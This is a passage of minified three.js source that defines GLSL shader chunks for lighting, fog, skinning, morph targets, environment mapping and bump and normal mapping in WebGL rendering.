);\n}\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal) {\n	float distance = dot( planeNormal, point-pointOnPlane );\n	return point - distance * planeNormal;\n}\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n	return sign( dot( point - pointOnPlane, planeNormal ) );\n}\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\n	return pointOnLine + lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) );\n}\nfloat calcLightAttenuation( float lightDistance, float cutoffDistance, float decayExponent ) {\n	if ( decayExponent > 0.0 ) {\n	  return pow( saturate( 1.0 - lightDistance / cutoffDistance ), decayExponent );\n	}\n	return 1.0;\n}\n\nvec3 inputToLinear( in vec3 a ) {\n#ifdef GAMMA_INPUT\n	return pow( a, vec3( float( GAMMA_FACTOR ) ) );\n#else\n	return a;\n#endif\n}\nvec3 linearToOutput( in vec3 a ) {\n#ifdef GAMMA_OUTPUT\n	return pow( a, vec3( 1.0 / float( GAMMA_FACTOR ) ) );\n#else\n	return a;\n#endif\n}\n",THREE.ShaderChunk.alphatest_fragment="#ifdef ALPHATEST\n\n	if ( diffuseColor.a < ALPHATEST ) discard;\n\n#endif\n",THREE.ShaderChunk.lights_lambert_vertex="vLightFront = vec3( 0.0 );\n\n#ifdef DOUBLE_SIDED\n\n	vLightBack = vec3( 0.0 );\n\n#endif\n\ntransformedNormal = normalize( transformedNormal );\n\n#if MAX_DIR_LIGHTS > 0\n\nfor( int i = 0; i < MAX_DIR_LIGHTS; i ++ ) {\n\n	vec3 dirVector = transformDirection( directionalLightDirection[ i ], viewMatrix );\n\n	float dotProduct = dot( transformedNormal, dirVector );\n	vec3 directionalLightWeighting = vec3( max( dotProduct, 0.0 ) );\n\n	#ifdef DOUBLE_SIDED\n\n		vec3 directionalLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );\n\n		#ifdef WRAP_AROUND\n\n			vec3 directionalLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );\n\n		#endif\n\n	#endif\n\n	#ifdef WRAP_AROUND\n\n		vec3 directionalLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );\n		directionalLightWeighting = mix( directionalLightWeighting, directionalLightWeightingHalf, wrapRGB );\n\n		#ifdef DOUBLE_SIDED\n\n			directionalLightWeightingBack = mix( directionalLightWeightingBack, directionalLightWeightingHalfBack, wrapRGB );\n\n		#endif\n\n	#endif\n\n	vLightFront += directionalLightColor[ i ] * directionalLightWeighting;\n\n	#ifdef DOUBLE_SIDED\n\n		vLightBack += directionalLightColor[ i ] * directionalLightWeightingBack;\n\n	#endif\n\n}\n\n#endif\n\n#if MAX_POINT_LIGHTS > 0\n\n	for( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {\n\n		vec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );\n		vec3 lVector = lPosition.xyz - mvPosition.xyz;\n\n		float attenuation = calcLightAttenuation( length( lVector ), pointLightDistance[ i ], pointLightDecay[ i ] );\n\n		lVector = normalize( lVector );\n		float dotProduct = dot( transformedNormal, lVector );\n\n		vec3 pointLightWeighting = vec3( max( dotProduct, 0.0 ) );\n\n		#ifdef DOUBLE_SIDED\n\n			vec3 pointLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );\n\n			#ifdef WRAP_AROUND\n\n				vec3 pointLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );\n\n			#endif\n\n		#endif\n\n		#ifdef WRAP_AROUND\n\n			vec3 pointLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );\n			pointLightWeighting = mix( pointLightWeighting, pointLightWeightingHalf, wrapRGB );\n\n			#ifdef DOUBLE_SIDED\n\n				pointLightWeightingBack = mix( pointLightWeightingBack, pointLightWeightingHalfBack, wrapRGB );\n\n			#endif\n\n		#endif\n\n		vLightFront += pointLightColor[ i ] * pointLightWeighting * attenuation;\n\n		#ifdef DOUBLE_SIDED\n\n			vLightBack += pointLightColor[ i ] * pointLightWeightingBack * attenuation;\n\n		#endif\n\n	}\n\n#endif\n\n#if MAX_SPOT_LIGHTS > 0\n\n	for( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {\n\n		vec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );\n		vec3 lVector = lPosition.xyz - mvPosition.xyz;\n\n		float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - worldPosition.xyz ) );\n\n		if ( spotEffect > spotLightAngleCos[ i ] ) {\n\n			spotEffect = max( pow( max( spotEffect, 0.0 ), spotLightExponent[ i ] ), 0.0 );\n\n			float attenuation = calcLightAttenuation( length( lVector ), spotLightDistance[ i ], spotLightDecay[ i ] );\n\n			lVector = normalize( lVector );\n\n			float dotProduct = dot( transformedNormal, lVector );\n			vec3 spotLightWeighting = vec3( max( dotProduct, 0.0 ) );\n\n			#ifdef DOUBLE_SIDED\n\n				vec3 spotLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );\n\n				#ifdef WRAP_AROUND\n\n					vec3 spotLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );\n\n				#endif\n\n			#endif\n\n			#ifdef WRAP_AROUND\n\n				vec3 spotLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );\n				spotLightWeighting = mix( spotLightWeighting, spotLightWeightingHalf, wrapRGB );\n\n				#ifdef DOUBLE_SIDED\n\n					spotLightWeightingBack = mix( spotLightWeightingBack, spotLightWeightingHalfBack, wrapRGB );\n\n				#endif\n\n			#endif\n\n			vLightFront += spotLightColor[ i ] * spotLightWeighting * attenuation * spotEffect;\n\n			#ifdef DOUBLE_SIDED\n\n				vLightBack += spotLightColor[ i ] * spotLightWeightingBack * attenuation * spotEffect;\n\n			#endif\n\n		}\n\n	}\n\n#endif\n\n#if MAX_HEMI_LIGHTS > 0\n\n	for( int i = 0; i < MAX_HEMI_LIGHTS; i ++ ) {\n\n		vec3 lVector = transformDirection( hemisphereLightDirection[ i ], viewMatrix );\n\n		float dotProduct = dot( transformedNormal, lVector );\n\n		float hemiDiffuseWeight = 0.5 * dotProduct + 0.5;\n		float hemiDiffuseWeightBack = -0.5 * dotProduct + 0.5;\n\n		vLightFront += mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );\n\n		#ifdef DOUBLE_SIDED\n\n			vLightBack += mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeightBack );\n\n		#endif\n\n	}\n\n#endif\n\nvLightFront += ambientLightColor;\n\n#ifdef DOUBLE_SIDED\n\n	vLightBack += ambientLightColor;\n\n#endif\n",THREE.ShaderChunk.map_particle_pars_fragment="#ifdef USE_MAP\n\n	uniform vec4 offsetRepeat;\n	uniform sampler2D map;\n\n#endif\n",THREE.ShaderChunk.default_vertex="#ifdef USE_SKINNING\n\n	vec4 mvPosition = modelViewMatrix * skinned;\n\n#elif defined( USE_MORPHTARGETS )\n\n	vec4 mvPosition = modelViewMatrix * vec4( morphed, 1.0 );\n\n#else\n\n	vec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\n\n#endif\n\ngl_Position = projectionMatrix * mvPosition;\n",THREE.ShaderChunk.map_pars_fragment="#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP )\n\n	varying vec2 vUv;\n\n#endif\n\n#ifdef USE_MAP\n\n	uniform sampler2D map;\n\n#endif",THREE.ShaderChunk.skinnormal_vertex="#ifdef USE_SKINNING\n\n	mat4 skinMatrix = mat4( 0.0 );\n	skinMatrix += skinWeight.x * boneMatX;\n	skinMatrix += skinWeight.y * boneMatY;\n	skinMatrix += skinWeight.z * boneMatZ;\n	skinMatrix += skinWeight.w * boneMatW;\n	skinMatrix  = bindMatrixInverse * skinMatrix * bindMatrix;\n\n	#ifdef USE_MORPHNORMALS\n\n	vec4 skinnedNormal = skinMatrix * vec4( morphedNormal, 0.0 );\n\n	#else\n\n	vec4 skinnedNormal = skinMatrix * vec4( normal, 0.0 );\n\n	#endif\n\n#endif\n",THREE.ShaderChunk.logdepthbuf_pars_vertex="#ifdef USE_LOGDEPTHBUF\n\n	#ifdef USE_LOGDEPTHBUF_EXT\n\n		varying float vFragDepth;\n\n	#endif\n\n	uniform float logDepthBufFC;\n\n#endif",THREE.ShaderChunk.lightmap_pars_vertex="#ifdef USE_LIGHTMAP\n\n	varying vec2 vUv2;\n\n#endif",THREE.ShaderChunk.lights_phong_fragment="#ifndef FLAT_SHADED\n\n	vec3 normal = normalize( vNormal );\n\n	#ifdef DOUBLE_SIDED\n\n		normal = normal * ( -1.0 + 2.0 * float( gl_FrontFacing ) );\n\n	#endif\n\n#else\n\n	vec3 fdx = dFdx( vViewPosition );\n	vec3 fdy = dFdy( vViewPosition );\n	vec3 normal = normalize( cross( fdx, fdy ) );\n\n#endif\n\nvec3 viewPosition = normalize( vViewPosition );\n\n#ifdef USE_NORMALMAP\n\n	normal = perturbNormal2Arb( -vViewPosition, normal );\n\n#elif defined( USE_BUMPMAP )\n\n	normal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\n\n#endif\n\nvec3 totalDiffuseLight = vec3( 0.0 );\nvec3 totalSpecularLight = vec3( 0.0 );\n\n#if MAX_POINT_LIGHTS > 0\n\n	for ( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {\n\n		vec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );\n		vec3 lVector = lPosition.xyz + vViewPosition.xyz;\n\n		float attenuation = calcLightAttenuation( length( lVector ), pointLightDistance[ i ], pointLightDecay[ i ] );\n\n		lVector = normalize( lVector );\n\n		// diffuse\n\n		float dotProduct = dot( normal, lVector );\n\n		#ifdef WRAP_AROUND\n\n			float pointDiffuseWeightFull = max( dotProduct, 0.0 );\n			float pointDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );\n\n			vec3 pointDiffuseWeight = mix( vec3( pointDiffuseWeightFull ), vec3( pointDiffuseWeightHalf ), wrapRGB );\n\n		#else\n\n			float pointDiffuseWeight = max( dotProduct, 0.0 );\n\n		#endif\n\n		totalDiffuseLight += pointLightColor[ i ] * pointDiffuseWeight * attenuation;\n\n				// specular\n\n		vec3 pointHalfVector = normalize( lVector + viewPosition );\n		float pointDotNormalHalf = max( dot( normal, pointHalfVector ), 0.0 );\n		float pointSpecularWeight = specularStrength * max( pow( pointDotNormalHalf, shininess ), 0.0 );\n\n		float specularNormalization = ( shininess + 2.0 ) / 8.0;\n\n		vec3 schlick = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVector, pointHalfVector ), 0.0 ), 5.0 );\n		totalSpecularLight += schlick * pointLightColor[ i ] * pointSpecularWeight * pointDiffuseWeight * attenuation * specularNormalization;\n\n	}\n\n#endif\n\n#if MAX_SPOT_LIGHTS > 0\n\n	for ( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {\n\n		vec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );\n		vec3 lVector = lPosition.xyz + vViewPosition.xyz;\n\n		float attenuation = calcLightAttenuation( length( lVector ), spotLightDistance[ i ], spotLightDecay[ i ] );\n\n		lVector = normalize( lVector );\n\n		float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - vWorldPosition ) );\n\n		if ( spotEffect > spotLightAngleCos[ i ] ) {\n\n			spotEffect = max( pow( max( spotEffect, 0.0 ), spotLightExponent[ i ] ), 0.0 );\n\n			// diffuse\n\n			float dotProduct = dot( normal, lVector );\n\n			#ifdef WRAP_AROUND\n\n				float spotDiffuseWeightFull = max( dotProduct, 0.0 );\n				float spotDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );\n\n				vec3 spotDiffuseWeight = mix( vec3( spotDiffuseWeightFull ), vec3( spotDiffuseWeightHalf ), wrapRGB );\n\n			#else\n\n				float spotDiffuseWeight = max( dotProduct, 0.0 );\n\n			#endif\n\n			totalDiffuseLight += spotLightColor[ i ] * spotDiffuseWeight * attenuation * spotEffect;\n\n			// specular\n\n			vec3 spotHalfVector = normalize( lVector + viewPosition );\n			float spotDotNormalHalf = max( dot( normal, spotHalfVector ), 0.0 );\n			float spotSpecularWeight = specularStrength * max( pow( spotDotNormalHalf, shininess ), 0.0 );\n\n			float specularNormalization = ( shininess + 2.0 ) / 8.0;\n\n			vec3 schlick = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVector, spotHalfVector ), 0.0 ), 5.0 );\n			totalSpecularLight += schlick * spotLightColor[ i ] * spotSpecularWeight * spotDiffuseWeight * attenuation * specularNormalization * spotEffect;\n\n		}\n\n	}\n\n#endif\n\n#if MAX_DIR_LIGHTS > 0\n\n	for( int i = 0; i < MAX_DIR_LIGHTS; i ++ ) {\n\n		vec3 dirVector = transformDirection( directionalLightDirection[ i ], viewMatrix );\n\n		// diffuse\n\n		float dotProduct = dot( normal, dirVector );\n\n		#ifdef WRAP_AROUND\n\n			float dirDiffuseWeightFull = max( dotProduct, 0.0 );\n			float dirDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );\n\n			vec3 dirDiffuseWeight = mix( vec3( dirDiffuseWeightFull ), vec3( dirDiffuseWeightHalf ), wrapRGB );\n\n		#else\n\n			float dirDiffuseWeight = max( dotProduct, 0.0 );\n\n		#endif\n\n		totalDiffuseLight += directionalLightColor[ i ] * dirDiffuseWeight;\n\n		// specular\n\n		vec3 dirHalfVector = normalize( dirVector + viewPosition );\n		float dirDotNormalHalf = max( dot( normal, dirHalfVector ), 0.0 );\n		float dirSpecularWeight = specularStrength * max( pow( dirDotNormalHalf, shininess ), 0.0 );\n\n		/*\n		// fresnel term from skin shader\n		const float F0 = 0.128;\n\n		float base = 1.0 - dot( viewPosition, dirHalfVector );\n		float exponential = pow( base, 5.0 );\n\n		float fresnel = exponential + F0 * ( 1.0 - exponential );\n		*/\n\n		/*\n		// fresnel term from fresnel shader\n		const float mFresnelBias = 0.08;\n		const float mFresnelScale = 0.3;\n		const float mFresnelPower = 5.0;\n\n		float fresnel = mFresnelBias + mFresnelScale * pow( 1.0 + dot( normalize( -viewPosition ), normal ), mFresnelPower );\n		*/\n\n		float specularNormalization = ( shininess + 2.0 ) / 8.0;\n\n		// 		dirSpecular += specular * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight * specularNormalization * fresnel;\n\n		vec3 schlick = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( dirVector, dirHalfVector ), 0.0 ), 5.0 );\n		totalSpecularLight += schlick * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight * specularNormalization;\n\n\n	}\n\n#endif\n\n#if MAX_HEMI_LIGHTS > 0\n\n	for( int i = 0; i < MAX_HEMI_LIGHTS; i ++ ) {\n\n		vec3 lVector = transformDirection( hemisphereLightDirection[ i ], viewMatrix );\n\n		// diffuse\n\n		float dotProduct = dot( normal, lVector );\n		float hemiDiffuseWeight = 0.5 * dotProduct + 0.5;\n\n		vec3 hemiColor = mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );\n\n		totalDiffuseLight += hemiColor;\n\n		// specular (sky light)\n\n		vec3 hemiHalfVectorSky = normalize( lVector + viewPosition );\n		float hemiDotNormalHalfSky = 0.5 * dot( normal, hemiHalfVectorSky ) + 0.5;\n		float hemiSpecularWeightSky = specularStrength * max( pow( max( hemiDotNormalHalfSky, 0.0 ), shininess ), 0.0 );\n\n		// specular (ground light)\n\n		vec3 lVectorGround = -lVector;\n\n		vec3 hemiHalfVectorGround = normalize( lVectorGround + viewPosition );\n		float hemiDotNormalHalfGround = 0.5 * dot( normal, hemiHalfVectorGround ) + 0.5;\n		float hemiSpecularWeightGround = specularStrength * max( pow( max( hemiDotNormalHalfGround, 0.0 ), shininess ), 0.0 );\n\n		float dotProductGround = dot( normal, lVectorGround );\n\n		float specularNormalization = ( shininess + 2.0 ) / 8.0;\n\n		vec3 schlickSky = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVector, hemiHalfVectorSky ), 0.0 ), 5.0 );\n		vec3 schlickGround = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 0.0 ), 5.0 );\n		totalSpecularLight += hemiColor * specularNormalization * ( schlickSky * hemiSpecularWeightSky * max( dotProduct, 0.0 ) + schlickGround * hemiSpecularWeightGround * max( dotProductGround, 0.0 ) );\n\n	}\n\n#endif\n\n#ifdef METAL\n\n	outgoingLight += diffuseColor.rgb * ( totalDiffuseLight + ambientLightColor ) * specular + totalSpecularLight + emissive;\n\n#else\n\n	outgoingLight += diffuseColor.rgb * ( totalDiffuseLight + ambientLightColor ) + totalSpecularLight + emissive;\n\n#endif\n",
THREE.ShaderChunk.fog_pars_fragment="#ifdef USE_FOG\n\n	uniform vec3 fogColor;\n\n	#ifdef FOG_EXP2\n\n		uniform float fogDensity;\n\n	#else\n\n		uniform float fogNear;\n		uniform float fogFar;\n	#endif\n\n#endif",THREE.ShaderChunk.morphnormal_vertex="#ifdef USE_MORPHNORMALS\n\n	vec3 morphedNormal = vec3( 0.0 );\n\n	morphedNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\n	morphedNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\n	morphedNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\n	morphedNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\n\n	morphedNormal += normal;\n\n#endif",THREE.ShaderChunk.envmap_pars_fragment="#ifdef USE_ENVMAP\n\n	uniform float reflectivity;\n	#ifdef ENVMAP_TYPE_CUBE\n		uniform samplerCube envMap;\n	#else\n		uniform sampler2D envMap;\n	#endif\n	uniform float flipEnvMap;\n\n	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\n\n		uniform float refractionRatio;\n\n	#else\n\n		varying vec3 vReflect;\n\n	#endif\n\n#endif\n",THREE.ShaderChunk.logdepthbuf_fragment="#if defined(USE_LOGDEPTHBUF) && defined(USE_LOGDEPTHBUF_EXT)\n\n	gl_FragDepthEXT = log2(vFragDepth) * logDepthBufFC * 0.5;\n\n#endif",THREE.ShaderChunk.normalmap_pars_fragment="#ifdef USE_NORMALMAP\n\n	uniform sampler2D normalMap;\n	uniform vec2 normalScale;\n\n	// Per-Pixel Tangent Space Normal Mapping\n	// http://hacksoflife.blogspot.ch/2009/11/per-pixel-tangent-space-normal-mapping.html\n\n	vec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {\n\n		vec3 q0 = dFdx( eye_pos.xyz );\n		vec3 q1 = dFdy( eye_pos.xyz );\n		vec2 st0 = dFdx( vUv.st );\n		vec2 st1 = dFdy( vUv.st );\n\n		vec3 S = normalize( q0 * st1.t - q1 * st0.t );\n		vec3 T = normalize( -q0 * st1.s + q1 * st0.s );\n		vec3 N = normalize( surf_norm );\n\n		vec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n		mapN.xy = normalScale * mapN.xy;\n		mat3 tsn = mat3( S, T, N );\n		return normalize( tsn * mapN );\n\n	}\n\n#endif\n",THREE.ShaderChunk.lights_phong_pars_vertex="#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP ) || defined( USE_ENVMAP )\n\n	varying vec3 vWorldPosition;\n\n#endif\n",THREE.ShaderChunk.lightmap_pars_fragment="#ifdef USE_LIGHTMAP\n\n	varying vec2 vUv2;\n	uniform sampler2D lightMap;\n\n#endif",THREE.ShaderChunk.shadowmap_vertex="#ifdef USE_SHADOWMAP\n\n	for( int i = 0; i < MAX_SHADOWS; i ++ ) {\n\n		vShadowCoord[ i ] = shadowMatrix[ i ] * worldPosition;\n\n	}\n\n#endif",THREE.ShaderChunk.lights_phong_vertex="#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP ) || defined( USE_ENVMAP )\n\n	vWorldPosition = worldPosition.xyz;\n\n#endif",THREE.ShaderChunk.map_fragment="#ifdef USE_MAP\n\n	vec4 texelColor = texture2D( map, vUv );\n\n	texelColor.xyz = inputToLinear( texelColor.xyz );\n\n	diffuseColor *= texelColor;\n\n#endif",THREE.ShaderChunk.lightmap_vertex="#ifdef USE_LIGHTMAP\n\n	vUv2 = uv2;\n\n#endif",THREE.ShaderChunk.map_particle_fragment="#ifdef USE_MAP\n\n	diffuseColor *= texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) * offsetRepeat.zw + offsetRepeat.xy );\n\n#endif\n",THREE.ShaderChunk.color_pars_fragment="#ifdef USE_COLOR\n\n	varying vec3 vColor;\n\n#endif\n",THREE.ShaderChunk.color_vertex="#ifdef USE_COLOR\n\n	vColor.xyz = inputToLinear( color.xyz );\n\n#endif",THREE.ShaderChunk.skinning_vertex="#ifdef USE_SKINNING\n\n	#ifdef USE_MORPHTARGETS\n\n	vec4 skinVertex = bindMatrix * vec4( morphed, 1.0 );\n\n	#else\n\n	vec4 skinVertex = bindMatrix * vec4( position, 1.0 );\n\n	#endif\n\n	vec4 skinned = vec4( 0.0 );\n	skinned += boneMatX * skinVertex * skinWeight.x;\n	skinned += boneMatY * skinVertex * skinWeight.y;\n	skinned += boneMatZ * skinVertex * skinWeight.z;\n	skinned += boneMatW * skinVertex * skinWeight.w;\n	skinned  = bindMatrixInverse * skinned;\n\n#endif\n",THREE.ShaderChunk.envmap_pars_vertex="#if defined( USE_ENVMAP ) && ! defined( USE_BUMPMAP ) && ! defined( USE_NORMALMAP ) && ! defined( PHONG )\n\n	varying vec3 vReflect;\n\n	uniform float refractionRatio;\n\n#endif\n",THREE.ShaderChunk.linear_to_gamma_fragment="\n	outgoingLight = linearToOutput( outgoingLight );\n",THREE.ShaderChunk.color_pars_vertex="#ifdef USE_COLOR\n\n	varying vec3 vColor;\n\n#endif",THREE.ShaderChunk.lights_lambert_pars_vertex="uniform vec3 ambientLightColor;\n\n#if MAX_DIR_LIGHTS > 0\n\n	uniform vec3 directionalLightColor[ MAX_DIR_LIGHTS ];\n	uniform vec3 directionalLightDirection[ MAX_DIR_LIGHTS ];\n\n#endif\n\n#if MAX_HEMI_LIGHTS > 0\n\n	uniform vec3 hemisphereLightSkyColor[ MAX_HEMI_LIGHTS ];\n	uniform vec3 hemisphereLightGroundColor[ MAX_HEMI_LIGHTS ];\n	uniform vec3 hemisphereLightDirection[ MAX_HEMI_LIGHTS ];\n\n#endif\n\n#if MAX_POINT_LIGHTS > 0\n\n	uniform vec3 pointLightColor[ MAX_POINT_LIGHTS ];\n	uniform vec3 pointLightPosition[ MAX_POINT_LIGHTS ];\n	uniform float pointLightDistance[ MAX_POINT_LIGHTS ];\n	uniform float pointLightDecay[ MAX_POINT_LIGHTS ];\n\n#endif\n\n#if MAX_SPOT_LIGHTS > 0\n\n	uniform vec3 spotLightColor[ MAX_SPOT_LIGHTS ];\n	uniform vec3 spotLightPosition[ MAX_SPOT_LIGHTS ];\n	uniform vec3 spotLightDirection[ MAX_SPOT_LIGHTS ];\n	uniform float spotLightDistance[ MAX_SPOT_LIGHTS ];\n	uniform float spotLightAngleCos[ MAX_SPOT_LIGHTS ];\n	uniform float spotLightExponent[ MAX_SPOT_LIGHTS ];\n	uniform float spotLightDecay[ MAX_SPOT_LIGHTS ];\n\n#endif\n\n#ifdef WRAP_AROUND\n\n	uniform vec3 wrapRGB;\n\n#endif\n",THREE.ShaderChunk.map_pars_vertex="#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP )\n\n	varying vec2 vUv;\n	uniform vec4 offsetRepeat;\n\n#endif\n",THREE.ShaderChunk.envmap_fragment="#ifdef USE_ENVMAP\n\n	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\n\n		vec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\n\n		// Transforming Normal Vectors with the Inverse Transformation\n		vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\n\n		#ifdef ENVMAP_MODE_REFLECTION\n\n			vec3 reflectVec = reflect( cameraToVertex, worldNormal );\n\n		#else\n\n			vec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\n\n		#endif\n\n	#else\n\n		vec3 reflectVec = vReflect;\n\n	#endif\n\n	#ifdef DOUBLE_SIDED\n		float flipNormal = ( -1.0 + 2.0 * float( gl_FrontFacing ) );\n	#else\n		float flipNormal = 1.0;\n	#endif\n\n	#ifdef ENVMAP_TYPE_CUBE\n		vec4 envColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\n\n	#elif defined( ENVMAP_TYPE_EQUIREC )\n		vec2 sampleUV;\n		sampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\n		sampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\n		vec4 envColor = texture2D( envMap, sampleUV );\n\n	#elif defined( ENVMAP_TYPE_SPHERE )\n		vec3 reflectView = flipNormal * normalize((viewMatrix * vec4( reflectVec, 0.0 )).xyz + vec3(0.0,0.0,1.0));\n		vec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\n	#endif\n\n	envColor.xyz = inputToLinear( envColor.xyz );\n\n	#ifdef ENVMAP_BLENDING_MULTIPLY\n\n		outgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\n\n	#elif defined( ENVMAP_BLENDING_MIX )\n\n		outgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\n\n	#elif defined( ENVMAP_BLENDING_ADD )\n\n		outgoingLight += envColor.xyz * specularStrength * reflectivity;\n\n	#endif\n\n#endif\n",THREE.ShaderChunk.specularmap_pars_fragment="#ifdef USE_SPECULARMAP\n\n	uniform sampler2D specularMap;\n\n#endif",THREE.ShaderChunk.logdepthbuf_vertex="#ifdef USE_LOGDEPTHBUF\n\n	gl_Position.z = log2(max( EPSILON, gl_Position.w + 1.0 )) * logDepthBufFC;\n\n	#ifdef USE_LOGDEPTHBUF_EXT\n\n		vFragDepth = 1.0 + gl_Position.w;\n\n#else\n\n		gl_Position.z = (gl_Position.z - 1.0) * gl_Position.w;\n\n	#endif\n\n#endif",THREE.ShaderChunk.morphtarget_pars_vertex="#ifdef USE_MORPHTARGETS\n\n	#ifndef USE_MORPHNORMALS\n\n	uniform float morphTargetInfluences[ 8 ];\n\n	#else\n\n	uniform float morphTargetInfluences[ 4 ];\n\n	#endif\n\n#endif",THREE.ShaderChunk.specularmap_fragment="float specularStrength;\n\n#ifdef USE_SPECULARMAP\n\n	vec4 texelSpecular = texture2D( specularMap, vUv );\n	specularStrength = texelSpecular.r;\n\n#else\n\n	specularStrength = 1.0;\n\n#endif",THREE.ShaderChunk.fog_fragment="#ifdef USE_FOG\n\n	#ifdef USE_LOGDEPTHBUF_EXT\n\n		float depth = gl_FragDepthEXT / gl_FragCoord.w;\n\n	#else\n\n		float depth = gl_FragCoord.z / gl_FragCoord.w;\n\n	#endif\n\n	#ifdef FOG_EXP2\n\n		float fogFactor = exp2( - square( fogDensity ) * square( depth ) * LOG2 );\n		fogFactor = whiteCompliment( fogFactor );\n\n	#else\n\n		float fogFactor = smoothstep( fogNear, fogFar, depth );\n\n	#endif\n	\n	outgoingLight = mix( outgoingLight, fogColor, fogFactor );\n\n#endif",THREE.ShaderChunk.bumpmap_pars_fragment="#ifdef USE_BUMPMAP\n\n	uniform sampler2D bumpMap;\n	uniform float bumpScale;\n\n	// Derivative maps - bump mapping unparametrized surfaces by Morten Mikkelsen\n	// http://mmikkelsen3d.blogspot.sk/2011/07/derivative-maps.html\n\n	// Evaluate the derivative of the height w.r.t. screen-space using forward differencing (listing 2)\n\n	vec2 dHdxy_fwd() {\n\n		vec2 dSTdx = dFdx( vUv );\n		vec2 dSTdy = dFdy( vUv );\n\n		float Hll = bumpScale * texture2D( bumpMap, vUv ).x;\n		float dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\n		float dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\n\n		return vec2( dBx, dBy );\n\n	}\n\n	vec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\n\n		vec3 vSigmaX = dFdx( surf_pos );\n		vec3 vSigmaY = dFdy( surf_pos );\n		vec3 vN = surf_norm;		// normalized\n\n		vec3 R1 = cross( vSigmaY, vN );\n		vec3 R2 = cross( vN, vSigmaX );\n\n		float fDet = dot( vSigmaX, R1 );\n\n		vec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\n		return normalize( abs( fDet ) * surf_norm - vGrad );\n\n	}\n\n#endif\n",THREE.ShaderChunk.defaultnormal_vertex="#ifdef USE_SKINNING\n\n	vec3 objectNormal = skinnedNormal.xyz;\n\n#elif defined( USE_MORPHNORMALS )\n\n	vec3 objectNormal = morphedNormal;\n\n#else\n\n	vec3 objectNormal = normal;\n\n#endif\n\n#ifdef FLIP_SIDED\n\n	objectNormal = -objectNormal;\n\n#endif\n\nvec3 transformedNormal = normalMatrix * objectNormal;\n",THREE.ShaderChunk.lights_phong_pars_fragment="uniform vec3 ambientLightColor;\n\n#if 